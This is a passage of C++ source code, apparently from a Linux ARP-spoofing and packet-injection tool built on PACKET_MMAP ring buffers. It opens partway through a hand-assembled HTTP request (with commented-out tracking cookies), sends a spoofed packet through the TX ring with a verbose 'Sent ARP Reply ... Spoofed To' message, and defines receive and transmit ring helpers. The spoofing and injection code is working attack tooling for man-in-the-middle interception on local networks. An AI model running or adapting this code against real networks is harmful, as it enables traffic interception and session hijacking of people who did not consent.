        'q','=','0','.','8',
        0x0D, 0x0A, // accept

        'A','c','c','e','p','t','-','L','a','n','g','u','a','g','e',':',' ',
        'e','n','-','U','S',',',
        'e','n',';',
        'q','=','0','.','5',
        0x0D, 0x0A, // accept-language

        'A','c','c','e','p','t','-','E','n','c','o','d','i','n','g',':',' ',
        'g','z','i','p',',',' ',
        'd','e','f','l','a','t','e',
        0x0D, 0x0A, // accept-encoding*/

        /*'C','o','o','k','i','e',':',' ',
        '_','_','u','t','m','a','=','7','3','0','3','4','5','0','4','.','1','2','5','7','8','6',
        '9','6','9','.','1','4','2','1','4','3','1','0','9','3','.','1','4','2','2','2','4','8',
        '6','8','1','.','1','4','2','2','7','8','4','0','2','5','.','7',';',     // utma

        ' ','_','_','u','t','m','z','=','7','3','0','3','4','5','0','4','.','1','4','2','1','4',
        '3','1','0','9','3','.','1','.','1','.',                                 // utmz

        'u','t','m','c','s','r','=','(','d','i','r','e','c','t',')','|',         // utmcsr

        'u','t','m','c','c','n','=','(','d','i','r','e','c','t',')','|',         // utmccn

        'u','t','m','c','m','d','=','(','n','o','n','e',')',';',                 // utmcmd

        ' ','_','_','q','c','a','=','P','0','-','1','9','5','3','3','6','1','1','0','8','-','1',
        '4','2','1','4','3','1','0','9','2','8','1','0',';',                     // qca

        ' ','_','j','s','u','i','d','=','3','2','7','7','8','6','5','7','6','0', // jsuid
        0x0D, 0x0A, // cookies*/

        'C','o','n','n','e','c','t','i','o','n',':',' ',
        'K','e','e','p','-','a','l','i','v','e',
        //'c','l','o','s','e',
        0x0D, 0x0A, // connection

        0x0D, 0x0A, // CR-LF Bound
    }; 
    
    // Fetch TPacket
    tpacket2_hdr *buf = (tpacket2_hdr*)process_tx(ring, sfd, treq);
    std::memcpy(buf + (TPACKET2_HDRLEN - sizeof(sockaddr_ll)), packet, sizeof(packet)); // copy in
       
    // Prepare TPacket For Sending
    tx_release(ring, sizeof(packet), treq);

    // Send Spoofed Packet Back Out
    if(sendto(sfd, NULL, 0, 0, NULL, 0) == -1) {
        std::perror("send_ether_arp: sendto");
        return -1;
    }

    // Verbose
    if(verbose)
        std::printf("Sent ARP Reply: %s%s%s Spoofed To %s%02x:%02x:%02x:%02x:%02x:%02x%s\n",
            GREEN, inet_ntoa(*(in_addr*)&arpSpoof->ar_sip), NF,
            GREEN,
            arpSpoof->ar_sha[0], arpSpoof->ar_sha[1], arpSpoof->ar_sha[2],
            arpSpoof->ar_sha[3], arpSpoof->ar_sha[4], arpSpoof->ar_sha[5],
            NF);
        

    // Close RAW Socket
    if(close(sfdC)) {
        std::perror("close");
        return -1;
    }

    // Success
    return 0;
}

void* process_rx(unsigned char *&ring, int sfd) {
    // Set Up Polling
    pollfd pfd;
    pfd.fd      = sfd;
    pfd.events  = POLLIN | POLLRDNORM | POLLERR;
    pfd.revents = 0;

    // Fetch Our RX Frame
    tpacket2_hdr *header = (tpacket2_hdr*)(ring + (rxring_offset * getpagesize()));

    // Sanity Check Our Frame
    assert(!(((unsigned long)header)&(getpagesize()-1)));

    // Check For Consumption 
    if(!(header->tp_status & TP_STATUS_USER)) { // TP_STATUS_USER means process owns packet
        int ret = poll(&pfd, 1, -1);            // wait(poll)
        if(ret == -1) {
            if(errno != EINTR) {                // harder error
                std::perror("poll");
                return (void*)-1;
            }
            return NULL;                        // let user know signal interuption
        }
    }

    // Check Frame Metadata
    if(header->tp_status & TP_STATUS_COPY) {
        std::cerr << "\nincomplete packet detected";
        sleep(1);
    }
    if(header->tp_status & TP_STATUS_LOSING) {
        std::cerr << "\ndropped packet detected";
        sleep(1);
    }

    // Success, Return Packet
    return (void*)header;
}

void* process_tx(unsigned char *&ring, int sfd, tpacket_req3 treq) {
    // Set Up Polling
    pollfd pfd;
    pfd.fd      = sfd;
    pfd.events  = POLLOUT;
    pfd.revents = 0;

    // Fetch Our TX Frame
    tpacket2_hdr *header = (tpacket2_hdr*)((ring + (treq.tp_block_size * treq.tp_block_nr))
                                                 + (txring_offset      * getpagesize()));

    // Sanity Check Our Frame
    assert(!(((unsigned long)header)&(getpagesize()-1)));

    // Check For Availability
    if(!(header->tp_status & TP_STATUS_AVAILABLE)) {
        int ret = poll(&pfd, 1, -1);            // wait(poll)
        if(ret == -1) {
            if(errno != EINTR) {                // harder error
                std::perror("poll");
                return (void*)-1;
            }
            return NULL;                        // let user know signal interuption
        }
    }

    // Success, Return Packet
    return (void*)header;
}

void rx_release(unsigned char *&ring) {
    // Re-Fetch Our RX Frame
    tpacket2_hdr *header = (tpacket2_hdr*)(ring + (rxring_offset * getpagesize()));

    // Grant Kernel Status   
    header->tp_status = TP_STATUS_KERNEL; // flush status

    // Update Consumer Pointer
    rxring_offset = (rxring_offset + 1) & (RING_FRAMES - 1);
}

void tx_release(unsigned char *&ring, const unsigned len, tpacket_req3 treq) {
    // Re-Fetch Our TX Frame
    tpacket2_hdr *header = (tpacket2_hdr*)((ring + (treq.tp_block_size * treq.tp_block_nr))
                                                 + (txring_offset      * getpagesize()));   

    // Grant Send Status
    header->tp_len    = len;
    header->tp_status = TP_STATUS_SEND_REQUEST;

    // Update Consumer Pointer
    txring_offset = (txring_offset + 1) & (RING_FRAMES - 1);
}

